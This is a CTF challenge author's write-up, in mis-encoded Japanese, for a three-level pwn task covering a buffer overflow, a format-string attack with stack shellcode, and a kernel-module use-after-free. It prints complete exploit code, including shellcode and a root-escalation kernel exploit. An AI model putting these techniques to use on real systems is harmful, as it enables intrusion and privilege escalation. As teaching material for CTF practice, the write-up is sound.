
<p><script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=desert"></script></p>

<div class="keywords"><span class="btitle">keywords</span>
<p>BOF /  FSA /  
</p>
</div>
 <!-- KEYWORDS HERE -->
<div class="contents">[:contents]</div>
<p>Â </p>
<p>Â </p>
<h3>1: ã‚¤ãƒ³ãƒˆãƒ­</h3>
<p>ã„ã¤ãã‚„é–‹å‚¬ã•ã‚ŒãŸ<code>TSG LIVE!6 CTF</code>ã€‚120åˆ†ã¨ã„ã†è¶…çŸ­æœŸé–“ã®CTFã€‚pwnã‚’ä½œã£ãŸã®ã§ãã®æŒ¯ã‚Šè¿”ã‚Šã¨liveã®æ„Ÿæƒ³ã€‚</p>
<p></p>
<p></p>
<p></p>
<h3>2: å•é¡Œæ¦‚è¦</h3>
<p>Level 1~3ã§æ§‹æˆã•ã‚Œã‚‹å•é¡Œã€‚ã©ã®ãƒ¬ãƒ™ãƒ«ã‚‚LKMã‚’åˆ©ç”¨ã—ãŸãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’å…±é€šã—ã¦ä½¿ã£ã¦ã„ã‚‹ãŒã€Lv1/2ã¯LKMã‚’ä½¿ã‚ãªãã¦ã‚‚(ã¤ã¾ã‚Šã€QEMUä¸Šã§èµ°ã‚‰ã›ãªãã¦ã‚‚)è§£ã‘ã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã€‚</p>
<p>çŸ­æœŸé–“CTFã§ã‚ã‚Šã€ãƒ—ãƒ¬ã‚¤ãƒ¤ã®ç”»é¢ãŒå…¬é–‹ã•ã‚Œã‚‹ã¨ã„ã†æ€§è³ªä¸Šã€æ”¾é€æ˜ ãˆã™ã‚‹ã‚ˆã†ãªå•é¡Œã«ã—ãŸã‹ã£ãŸã€‚pwnã®æ¥½ã—ã„ã¨ã“ã‚ã¯ã‚¹ãƒ†ãƒƒãƒ—ã‚’è¸ã‚“ã§exploitã—ã¦ã„ãã¨ã“ã‚ã ã¨æ€ã£ã¦ã„ã‚‹ãŸã‚ã€Levelé †ã«ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ­ã‚¸ãƒƒã‚¯ãƒã‚¤ãƒ‘ã‚¹ãƒ»user shellã®å¥ªå–ãƒ»root shellã®å¥ªå–ã¨ã„ã†æµã‚Œã«ãªã£ã¦ã„ã‚‹ã€‚æ­£ç›´Level3ã¯ç‰¹å®šã®äººç‰©ã‚’ç‹™ã„æ’ƒã¡ã—ãŸå•é¡Œã§ã‚ã‚Šã€æ—©è§£ãã—ã¦ã‚®ãƒªã‚®ãƒª120åˆ†ã§ã„ã‘ã‚‹ã‹ãªã(é¡˜æœ›)ã¨ã„ã†é›£æ˜“åº¦ã«ãªã£ã¦ã„ã‚‹ã€‚</p>
<p></p>
<h3>3: SUSHI-DA1: logic bypass</h3>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">static.sh</div>
<pre class="prettyprint linenums lang-sh">
$ file ./client
./client: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=982caef5973f267fa669d3922c57233063f709d2, for GNU/Linux 3.2.0, not stripped
$ checksec --file ./client
[*] &#x27;/home/wataru/test/sandbox/client&#x27;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</pre>
<p></p>
<p>å†·ãˆé˜²æ­¢ã®å•é¡Œã€‚ãƒ†ãƒ¼ãƒã¯å¯¿å¸æ‰“ã¨ã„ã†ã‚¿ã‚¤ãƒ”ãƒ³ã‚°ã‚²ãƒ¼ãƒ ã€‚</p>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">client.c</div>
<pre class="prettyprint linenums lang-c">
  struct {
    unsigned long start, result;
    char type[MAX_LENGTH + 0x20];
    int pro;
  } info = {0};
 (snipped...)
  info.result = time(NULL) - info.start;
  puts(&quot;\n[ENTER] again to finish!&quot;);
  readn(info.type, 0x200);

  printf(&quot;\nğŸ‰ğŸ‰ğŸ‰Congrats! You typed in %lu secs!ğŸ‰ğŸ‰ğŸ‰\n&quot;, info.result);
  register_record(info.result);
  if(info.pro != 0) system(&quot;cat flag1&quot;);
</pre>
<p></p>
<p>ã‚¯ãƒªã‚¢ã—ãŸå¾Œã«ENTERã‚’å—ã‘ä»˜ã‘ã‚‹ç®‡æ‰€ãŒã‚ã‚‹ãŒã€ã“ã“ã§ãƒãƒƒãƒ•ã‚¡ã‚µã‚¤ã‚ºã®200+ã®ä»£ã‚ã‚Šã«0x200ã‚’å—ã‘ä»˜ã‘ã¦ã—ã¾ã£ã¦ã„ã‚‹ãŸã‚<code>struct info</code>å†…ã§BOFãŒç™ºç”Ÿã—<code>info.pro</code>ã‚’æ›¸ãæ›ãˆã‚‰ã‚Œã‚‹ã€‚</p>
<p></p>
<h3>4: SUSHI-DA2: user shell</h3>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">client.c</div>
<pre class="prettyprint linenums lang-c">
  while(success &lt; 3){
    unsigned question = rand() % 4;
    if(wordlist[question][0] == &#x27;\x00&#x27;) continue;
    printf(&quot;[TYPE]\n&quot;);
    printf(wordlist[question]); puts(&quot;&quot;);
    readn(info.type, 200);
    if(strncmp(wordlist[question], info.type, strlen(wordlist[question])) != 0)  warn_ret(&quot;ğŸ™…â€ğŸ™… ACCURACY SHOULD BE MORE IMPORTANT THAN SPEED.&quot;);
    ++success;
  }
(snipped...)
void add_phrase(void){
  char *buf = malloc(MAX_LENGTH + 0x20);
  printf(&quot;[NEW PHRASE] &quot;);
  readn(buf, MAX_LENGTH - 1);
  for(int ix=0; ix!=MAX_LENGTH-1; ++ix){
    if(buf[ix] == &#x27;\xa&#x27;) break;
    memcpy(wordlist[3]+ix, buf+ix, 1);
  }
}
</pre>
<p></p>
<p>ã‚¿ã‚¤ãƒ”ãƒ³ã‚°ã®ãŠé¡Œã‚’1ã¤ã ã‘ã‚«ã‚¹ã‚¿ãƒ ã§ãã‚‹ãŒã€ãŠé¡Œã®è¡¨ç¤ºã«FSBãŒã‚ã‚‹ã€‚ã“ã‚Œã§stackã®leakãŒã§ãã‚‹ã€‚</p>
<p>ã“ã®å¾Œã®æ–¹é‡ã¯å¤§ããåˆ†ã‘ã¦2ã¤ã‚ã‚‹ã€‚1ã¤ç›®ã¯ã€stackãŒRWXã«ãªã£ã¦ã„ã‚‹ãŸã‚stackã«shellcodeã‚’ç©ã‚“ã ä¸Šã§RAã‚’FSBã§æ›¸ãæ›ãˆã¦shellã‚’å–ã‚‹æ–¹æ³•ã€‚ã“ã®å ´åˆã€FSAã®å…¥åŠ›ã¨ç™ºç«ã™ã‚‹ãƒã‚¤ãƒ³ãƒˆãŒç•°ãªã‚‹ãŸã‚ã€FSAã§å¿…è¦ãªæº–å‚™(æ›¸ãæ›ãˆå¯¾è±¡ã®RAãŒã‚ã‚‹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’stackã«ç©ã‚€å¿…è¦ãŒã‚ã‚‹)ã¯mainé–¢æ•°ã®stackã«ç©ã‚“ã§ãŠãã“ã¨ã«ãªã‚‹ã€‚ã¾ãŸã€ç™ºç«ã«æ™‚é–“å·®ãŒã‚ã‚‹ã¨ã„ã†éƒ½åˆä¸Šã€å˜ç´”ã«pwntoolsã‚’ä½¿ã†ã ã‘ã§ã¯è§£ãã“ã¨ãŒã§ããªã„ã€‚</p>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">client.c</div>
<pre class="prettyprint linenums lang-c">
int main(int argc, char *argv[]){
  char buf[0x100];
  srand(time(NULL));
  setup();

  while(1==1){
    printf(&quot;\n\n$ &quot;);
    if (readn(buf, 100) &lt;= 0) die(&quot;[ERROR] readn&quot;);
</pre>
<p>2ã¤ç›®ã¯ã€canaryã ã‘ãƒªãƒ¼ã‚¯ã—ã¦ã‚ã¨ã¯é€šå¸¸ã®BOFã§ROPã™ã‚‹ã¨ã„ã†æ–¹æ³•ã€‚ã“ã£ã¡ã®ã»ã†ãŒå¤šåˆ†æ¥½ã€‚æ­£ç›´ã€canaryã¯leakã§ããªã„æ„Ÿã˜ã®è¨­å®šã«ã—ã¦ã‚‚è‰¯ã‹ã£ãŸ(bufã‚µã‚¤ã‚ºã‚’èª¿æ•´)ãŒã€200ã¨0x200ã‚’æ‰“ã¡é–“é•ãˆãŸã¨ã„ã†é›°å›²æ°—ã‚’å‡ºã—ãŸã‹ã£ãŸéƒ½åˆä¸Šã€canaryã®leak+ROPã¾ã§ã§ãã‚‹ãã‚‰ã„ã®è¨­å®šã«ãªã£ãŸã€‚</p>
<p></p>
<h3>5: SUSHI-DA3: root shell</h3>
<p>ã“ã“ã¾ã§ã§user shellãŒã¨ã‚Œã¦ã„ã‚‹ãŸã‚ã€ä»Šåº¦ã¯LKMã®ãƒã‚°ã‚’ã¤ã„ã¦rootã‚’ã¨ã‚‹ã€‚ãƒã‚°ã¯ä»¥ä¸‹ã€‚</p>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">sushi-da.c</div>
<pre class="prettyprint linenums lang-c">
long clear_old_records(void)
{
  int ix;
  char tmp[5] = {0};
  long date;
  for(ix=0; ix!=SUSHI_RECORD_MAX; ++ix){
    if(records[ix] == NULL) continue;
    strncpy(tmp, records[ix]-&gt;date, 4);
    if(kstrtol(tmp, 10, &amp;date) != 0 || date &lt;= 1990) kfree(records[ix]);
  }
  return 0;
}
</pre>
<p>ã‚¿ã‚¤ãƒ”ãƒ³ã‚°ã‚²ãƒ¼ãƒ ã®è¨˜éŒ²ã‚’LKMã‚’ä½¿ã£ã¦è¨˜éŒ²ã—ã¦ã„ã‚‹ã®ã ãŒã€å¤ã„ãƒ¬ã‚³ãƒ¼ãƒ‰(1990å¹´ä»¥å‰)ã¨ä¸æ­£ãªãƒ¬ã‚³ãƒ¼ãƒ‰ã‚’å‰Šé™¤ã™ã‚‹é–¢æ•°ã«ãŠã„ã¦kfreeã—ãŸã‚ã¨ã®å€¤ã‚’ã‚¯ãƒªã‚¢ã—ã¦ã„ãªã„ã€‚ã“ã‚Œã«ã‚ˆã‚ŠkUAFãŒç”Ÿã˜ã‚‹ã€‚</p>
<p>SMEP/SMAPç„¡åŠ¹KAISERç„¡åŠ¹ã§ã‚ã‚‹ãŸã‚ã€ã‚ã¨ã¯å‰²ã¨ä»»æ„ã®ã“ã¨ãŒã§ãã‚‹ã€‚editãŒãªã„ã“ã¨ã‚„kmallocã§ã¯ãªãkzallocãŒä½¿ã‚ã‚Œã¦ã„ã‚‹ã®ãŒã¡ã‚‡ã£ã¨å«Œãªæ°—ã‚‚ã™ã‚‹ãŒã€å®Ÿéš›ã¯double freeã‚‚ã‚ã‚‹ãŸã‚<code>seq_operations</code>ã§leakã—ãŸã‚ã¨ã«å†ã³ãã‚Œã‚’recordã¨ã—ã¦åˆ©ç”¨ã™ã‚‹ã“ã¨ã§RIPã‚’å–ã‚‹ã“ã¨ãŒã§ãã‚‹ã€‚</p>
<p></p>
<h3>6: full exploit</h3>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.py</div>
<pre class="prettyprint linenums lang-py">
#!/usr/bin/python2
# -*- coding: utf-8 -*-

# coding: 4 spaces

# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
import pwnlib
import sys, os

def handle_pow(r):
    print(r.recvuntil(b&#x27;python3 &#x27;))
    print(r.recvuntil(b&#x27; solve &#x27;))
    challenge = r.recvline().decode(&#x27;ascii&#x27;).strip()
    p = pwnlib.tubes.process.process([&#x27;kctf_bypass_pow&#x27;, challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b&#x27;Correct\n&#x27;))

hosts = (&quot;sushida.pwn.hakatashi.com&quot;,&quot;localhost&quot;,&quot;localhost&quot;)
ports = (1337,12300,23947)
rhp1 = {&#x27;host&#x27;:hosts[0],&#x27;port&#x27;:ports[0]}    #for actual server
rhp2 = {&#x27;host&#x27;:hosts[1],&#x27;port&#x27;:ports[1]}    #for localhost 
rhp3 = {&#x27;host&#x27;:hosts[2],&#x27;port&#x27;:ports[2]}    #for localhost running on docker
context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)
#binf = ELF(FILENAME)
#libc = ELF(LIBCNAME) if LIBCNAME!=&quot;&quot; else None


## utilities #########################################

def hoge(command):
  global c
  c.recvuntil(&quot;$ &quot;)
  c.sendline(command)

def typin():
  c.recvuntil(&quot;[TYPE]&quot;)
  c.recvline()
  c.sendline(c.recvline().rstrip())

def play_clear(avoid_nirugiri=True):
  global c
  hoge(&quot;play&quot;)
  for _ in range(3):
    typin()
  
def custom(phrase):
  global c
  hoge(&quot;custom&quot;)
  c.recvuntil(&quot;[NEW PHRASE] &quot;)
  c.sendline(phrase)

def custom_wait_NIRUGIRI(pay, append_nirugiri=True):
  global c
  print(&quot;[.] waiting luck...&quot;)
  res = &quot;&quot;
  found = False
  if append_nirugiri:
    custom(&quot;NIRUGIRI&quot; + pay)
  else:
    custom(pay)

  while True:
    hoge(&quot;play&quot;)
    for _ in range(3):
      c.recvuntil(&quot;[TYPE]&quot;)
      c.recvline()
      msg = c.recvline().rstrip()
      if &quot;NIRUGIRI&quot; in msg:
        found = True
        res = msg
        if append_nirugiri:
          c.sendline(&quot;NIRUGIRI&quot;+pay)
        else:
          c.sendline(pay)
      else:
        c.sendline(msg)
    c.recvuntil(&quot;ENTER&quot;)
    c.sendline(&quot;&quot;)
    if found:
      break      
  
  return res[len(&quot;NIRUGIRI&quot;):]

def inject_wait_NIRUGIRI(pay):
  global c
  print &quot;[.] injecting and waiting luck&quot;,
  res = &quot;&quot;
  found = False
  aborted = False
  custom(pay)

  while True:
    hoge(&quot;play&quot;)
    for _ in range(3):
      c.recvuntil(&quot;[TYPE]&quot;)
      c.recvline()
      msg = c.recvline().rstrip()
      if &quot;NIRUGIRI&quot; in msg:
        print(&quot;\n[!] FOUND&quot;)
        c.sendline(&quot;hey&quot;)
        return
      else:
        print &quot;.&quot;,
        c.sendline(msg)
    if aborted:
      aborted = False
      continue
    c.sendline(&quot;&quot;)

## exploit ###########################################

def exploit():
  global c
  global kctf
  MAX_TYPE = 200

  ##############################
  #  LEVEL 1                   #
  ##############################
  # overwrite info.pro
  play_clear()
  c.recvuntil(&quot;ENTER&quot;)
  c.sendline(&quot;A&quot;*0xf8)
  c.recvuntil(&quot;typed&quot;)
  c.recvline()
  flag1 = c.recvline().rstrip()
  if &quot;TSGLIVE&quot; not in flag1:
      exit(1)
  print(&quot;\n[!] Got a flag1 ğŸ‰ğŸ‰ğŸ‰ &quot; + flag1)

  ###############################
  ##  LEVEL 2                   #
  ###############################
  SC_START = 0x50
  pay = b&quot;&quot;

  # leak stack
  pay += &quot;%42$p&quot;
  leaked = int(custom_wait_NIRUGIRI(pay), 16)
  ra_play_game = leaked - 0x128
  buf_top = leaked - 0x230
  target_addr = ra_play_game + 0x38
  print(&quot;[+] leaked stack: &quot; + hex(leaked))
  print(&quot;[+] ra_play_game: &quot; + hex(ra_play_game))
  print(&quot;[+] buf_top: &quot; + hex(buf_top))
  pay_index = 47

  # calc
  v0 = target_addr &amp; 0xFFFF
  v1 = (target_addr &gt;&gt; 16) &amp; 0xFFFF
  v2 = (target_addr &gt;&gt; 32) &amp; 0xFFFF
  assert(v0&gt;8 and v1&gt;8 and v2&gt;8)
  vs = sorted([[0,v0],[1,v1],[2,v2]], key= lambda l: l[1])

  # place addr &amp; sc
  sc = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
  c.recvuntil(&quot;$ &quot;)
  pay = b&quot;&quot;
  pay += &quot;A&quot;*8
  pay += p64(ra_play_game) + p64(ra_play_game+2) + p64(ra_play_game+4)
  pay += sc
  assert(len(pay) &lt;= 0x50)
  assert(&quot;\x0a&quot; not in pay)
  c.sendline(pay)

  # overwrite return-addr with FSA
  pay = b&quot;&quot;
  pay += &quot;NIRUGIRI&quot;
  pay += &quot;%{}c&quot;.format(vs[0][1]-8)
  pay += &quot;%{}$hn&quot;.format(pay_index + vs[0][0])
  pay += &quot;%{}c&quot;.format(vs[1][1] - vs[0][1])
  pay += &quot;%{}$hn&quot;.format(pay_index + vs[1][0])
  pay += &quot;%{}c&quot;.format(vs[2][1] - vs[1][1])
  pay += &quot;%{}$hn&quot;.format(pay_index + vs[2][0])
  assert(&quot;\x0a&quot; not in pay)
  assert(len(pay) &lt; MAX_TYPE)
  print(&quot;[+] shellcode placed @ &quot; + hex(target_addr))

  # nirugiri
  inject_wait_NIRUGIRI(pay) # if NIRUGIRI comes first, it fails
  c.sendlineafter(&quot;/home/user $&quot;, &quot;cat ./flag2&quot;)
  flag2 = c.recvline()
  if &quot;TSGLIVE&quot; not in flag2:
      exit(2)
  print(&quot;\n[!] Got a flag2 ğŸ‰ğŸ‰ğŸ‰ &quot; + flag2)

  ##############################
  #  LEVEL 3                   #
  ##############################
  # pwning kernel...
  c.recvuntil(&quot;/home/user&quot;)
  print(&quot;[!] pwning kernel...&quot;)
  if kctf:
    with open(&quot;/home/user/exploit.gz.b64&quot;, &#x27;r&#x27;) as f:
      binary = f.read()
  else:
    with open(&quot;./exploit.gz.b64&quot;, &#x27;r&#x27;) as f:
      binary = f.read()

  progress = 0
  pp = 0
  N = 0x300
  total = len(binary)
  print(&quot;[+] sending base64ed exploit (total: {})...&quot;.format(hex(len(binary))))
  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
    c.sendlineafter(&#x27;$&#x27;, &#x27;echo -n &quot;{}&quot; &gt;&gt; exploit.gz.b64&#x27;.format(s)) # don&#x27;t forget -n
    progress += N
    if (float(progress) / float(total)) &gt; pp:
      pp += 0.1
      print(&quot;[.] sent {} bytes [{} %]&quot;.format(hex(progress), float(progress)*100.0/float(total)))
  c.sendlineafter(&#x27;$&#x27;, &#x27;base64 -d exploit.gz.b64 &gt; exploit.gz&#x27;)
  c.sendlineafter(&#x27;$&#x27;, &#x27;gunzip ./exploit.gz&#x27;)

  c.sendlineafter(&#x27;$&#x27;, &#x27;chmod +x ./exploit&#x27;)
  c.sendlineafter(&#x27;$&#x27;, &#x27;/home/user/exploit&#x27;)

  c.recvuntil(&quot;# &quot;)
  c.sendline(&quot;cat flag3&quot;)
  flag3 = c.recvline()
  if &quot;TSGLIVE&quot; not in flag3:
      exit(3)
  print(&quot;\n[!] Got a flag3 ğŸ‰ğŸ‰ğŸ‰ &quot; + flag3)


## main ##############################################

if __name__ == &quot;__main__&quot;:
    global c
    global kctf
    kctf = False
    
    if len(sys.argv)&gt;1:
      if sys.argv[1][0]==&quot;d&quot;:
        cmd = &quot;&quot;&quot;
          set follow-fork-mode parent
        &quot;&quot;&quot;
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]==&quot;r&quot;:
        c = remote(rhp1[&quot;host&quot;],rhp1[&quot;port&quot;])
      elif sys.argv[1][0]==&quot;v&quot;:
        c = remote(rhp3[&quot;host&quot;],rhp3[&quot;port&quot;])
      elif sys.argv[1][0]==&quot;k&quot;:
        c = remote(&quot;127.0.0.1&quot;, 1337) # kctf XXX
        kctf = True
        print(&quot;[+] kctf healthcheck mode&quot;)
        print(c.recvuntil(&quot;== proof-of-work: &quot;))
        if c.recvline().startswith(b&#x27;enabled&#x27;):
          handle_pow(c)
    else:
        c = remote(rhp2[&#x27;host&#x27;],rhp2[&#x27;port&#x27;])

    try:
        exploit()
    except:
        print(&quot;\n&quot;)
        print(sys.exc_info()[0], sys.exc_info()[1])
        print(&quot;\n[?] exploit failed... try again...&quot;)
        exit(4)
    if kctf:
        print(&quot;\n[+] healthcheck success!&quot;)
        exit(0)
    else:
        c.interactive()
</pre>
<p></p>
<p>kernel.</p>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">exploit.c</div>
<pre class="prettyprint linenums lang-c">
#define _GNU_SOURCE
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdint.h&gt;
#include &lt;unistd.h&gt;
#include &lt;assert.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;poll.h&gt;
#include &lt;pthread.h&gt;
#include &lt;err.h&gt;
#include &lt;errno.h&gt;
#include &lt;sched.h&gt;
#include &lt;linux/bpf.h&gt;
#include &lt;linux/filter.h&gt;
#include &lt;linux/userfaultfd.h&gt;
#include &lt;linux/prctl.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/ipc.h&gt;
#include &lt;sys/msg.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/xattr.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/uio.h&gt;
#include &lt;sys/shm.h&gt;

#include &quot;../include/sushi-da.h&quot;


// commands
#define DEV_PATH &quot;/dev/sushi-da&quot;   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &amp;msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit(&quot;KMALLOC&quot;);}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf(&quot;r15: %lx r14: %lx r13: %lx r12: %lx\n&quot;, regs-&gt;r15, regs-&gt;r14, regs-&gt;r13, regs-&gt;r12);
  printf(&quot;bp: %lx bx: %lx r11: %lx r10: %lx\n&quot;, regs-&gt;bp, regs-&gt;bx, regs-&gt;r11, regs-&gt;r10);
  printf(&quot;r9: %lx r8: %lx ax: %lx cx: %lx\n&quot;, regs-&gt;r9, regs-&gt;r8, regs-&gt;ax, regs-&gt;cx);
  printf(&quot;dx: %lx si: %lx di: %lx ip: %lx\n&quot;, regs-&gt;dx, regs-&gt;si, regs-&gt;di, regs-&gt;ip);
  printf(&quot;cs: %lx flags: %lx sp: %lx ss: %lx\n&quot;, regs-&gt;cs, regs-&gt;flags, regs-&gt;sp, regs-&gt;ss);
}
void NIRUGIRI(void)
{
  puts(&quot;[!] NIRUGIRI!&quot;);
  char *argv[] = {&quot;/bin/sh&quot;, NULL};
  char *envp[] = {NULL};
  puts(&quot;\n\n Got a root! ğŸ‰ğŸ‰ğŸ‰&quot;);
  execve(&quot;/bin/sh&quot;,argv,envp);
}

// should compile with -masm=intel
static void save_state(void) {
  asm(
      &quot;movq %0, %%cs\n&quot;
      &quot;movq %1, %%ss\n&quot;
      &quot;movq %2, %%rsp\n&quot;
      &quot;pushfq\n&quot;
      &quot;popq %3\n&quot;
      : &quot;=r&quot; (user_cs), &quot;=r&quot; (user_ss), &quot;=r&quot;(user_sp), &quot;=r&quot; (user_rflags) : : &quot;memory&quot; 		);
}

ulong kernbase;
ulong commit_creds, prepare_kernel_cred;

static void shellcode(void){
  ulong init_cred;
  asm(
    &quot;mov %%rdi, 0x0\n&quot;
    &quot;call %P1\n&quot;
    &quot;movq %0, %%rax&quot;
    : &quot;=r&quot; (init_cred) : &quot;r&quot; ((void*)prepare_kernel_cred) : &quot;memory&quot;
  );
  asm(
      &quot;mov %%rdi, %0\n&quot;
      &quot;call %P1\n&quot; 
      ::&quot;r&quot;((void *)init_cred), &quot;r&quot;((void *)commit_creds) : &quot;memory&quot;
  );
  asm(
      &quot;swapgs\n&quot;
      &quot;mov %%rax, %0\n&quot;
      &quot;push %%rax\n&quot;
      &quot;mov %%rax, %1\n&quot;
      &quot;push %%rax\n&quot;
      &quot;mov %%rax, %2\n&quot;
      &quot;push %%rax\n&quot;
      &quot;mov %%rax, %3\n&quot;
      &quot;push %%rax\n&quot;
      &quot;mov %%rax, %4\n&quot;
      &quot;push %%rax\n&quot;
      &quot;iretq\n&quot; 
      ::&quot;r&quot;(user_ss), &quot;r&quot;(user_sp), &quot;r&quot;(user_rflags), &quot;r&quot;(user_cs), &quot;r&quot;(&amp;NIRUGIRI) : &quot;memory&quot;
    );
}
// (END utils)

void register_record(int fd, int score, char *date){
  struct ioctl_register_query  q = {
    .record = {.result = score,},
  };
  strncpy(q.record.date, date, 0x10);
  if(ioctl(fd, SUSHI_REGISTER_RECORD, &amp;q) &lt; 0){
    errExit(&quot;register_record()&quot;);
  } 
}

void fetch_record(int fd, int rank, struct record *record){
  struct ioctl_fetch_query q = {
    .rank = rank,
  };
  if(ioctl(fd, SUSHI_FETCH_RECORD, &amp;q) &lt; 0){
    errExit(&quot;fetch_record()&quot;);
  } 
  memcpy(record, &amp;q.record, sizeof(struct record));
}

void clear_record(int fd){
  if(ioctl(fd, SUSHI_CLEAR_OLD_RECORD, NULL) &lt; 0){
    errExit(&quot;clear_record()&quot;);
  } 
}

void show_rankings(int fd){
  struct ioctl_fetch_query q;
  for (int ix = 0; ix != 3; ++ix){
    q.rank = ix + 1;
    if (ioctl(fd, SUSHI_FETCH_RECORD, &amp;q) &lt; 0) break;
    printf(&quot;%d: %ld sec : %s\n&quot;, ix + 1, q.record.result, q.record.date);
  }
}

void clear_all_records(int fd){
  if(ioctl(fd, SUSHI_CLEAR_ALL_RECORD, NULL) &lt; 0){
    errExit(&quot;clear_all_records()&quot;);
  }
}

int main(int argc, char *argv[]) {
  char inbuf[0x200];
  char outbuf[0x200];
  int seqfd;
  int tmpfd[0x90];
  memset(inbuf, 0, 0x200);
  memset(outbuf, 0, 0x200);
  printf(&quot;[.] pid: %d\n&quot;, getpid());
  printf(&quot;[.] NIRUGIRI at %p\n&quot;, &amp;NIRUGIRI);
  printf(&quot;[.] shellcode at %p\n&quot;, &amp;shellcode);
  int fd = open(DEV_PATH, O_RDWR);
  if(fd &lt;= 2){
    perror(&quot;[ERROR] failed to open mora&quot;);
    exit(0);
  }
  clear_all_records(fd);

  struct record r;
  struct record r1 = {
    .result = 1,
    .date = &quot;1930/03/12&quot;,
  };

  // heap spray
  puts(&quot;[.] heap spraying...&quot;);
  for (int ix = 0; ix != 0x90; ++ix)
  {
    tmpfd[ix] = open(&quot;/proc/self/stat&quot;, O_RDONLY);
  }

  // leak kernbase
  puts(&quot;[.] generating kUAF...&quot;);
  register_record(fd, r1.result, r1.date);
  clear_record(fd);
  if((seqfd = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt;= 0){
    errExit(&quot;open seq_operations&quot;);
  }
  fetch_record(fd, 1, &amp;r);

  const ulong _single_start = *((long*)r.date);
  const ulong kernbase = _single_start - 0x194090;
  printf(&quot;[+] single_start: %lx\n&quot;, _single_start);
  printf(&quot;[+] kernbase: %lx\n&quot;, kernbase);
  commit_creds = kernbase + 0x06cd00;
  printf(&quot;[!] commit_creds: %lx\n&quot;, commit_creds);
  prepare_kernel_cred = kernbase + 0x6d110;
  printf(&quot;[!] prepare_kernel_cred: %lx\n&quot;, prepare_kernel_cred);

  // double free
  struct record r2 = {
    .result = 3,
  };
  *((ulong*)r2.date) = &amp;shellcode;
  clear_record(fd);
  register_record(fd, r2.result, r2.date);

  // get RIP
  save_state();
  for (int ix = 0; ix != 0x80; ++ix){
    close(tmpfd[0x90 - 1 - ix]);
  }
  read(seqfd, inbuf, 0x10);

  return 0;
}
</pre>
<p></p>
<p>Makefile</p>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">Makefile</div>
<pre class="prettyprint linenums ">
# exploit
$(EXP)/exploit: $(EXP)/exploit.c
	docker run -it --rm -v &quot;$$PWD:$$PWD&quot; -w &quot;$$PWD&quot; alpine /bin/sh -c &#x27;apk add gcc musl-dev linux-headers &amp;&amp; $(CC) $(CPPFLAGS) $&lt;&#x27;
	#$(CC) $(CPPFLAGS) $&lt;
	strip $@

.INTERMEDIATE: $(EXP)/exploit.gz
$(EXP)/exploit.gz: $(EXP)/exploit
	gzip $&lt;
$(EXP)/exploit.gz.b64: $(EXP)/exploit.gz
	base64 $&lt; &gt; $@
exp: $(EXP)/exploit.gz.b64
</pre>
<p></p>
<h3>7: æ„Ÿæƒ³</h3>
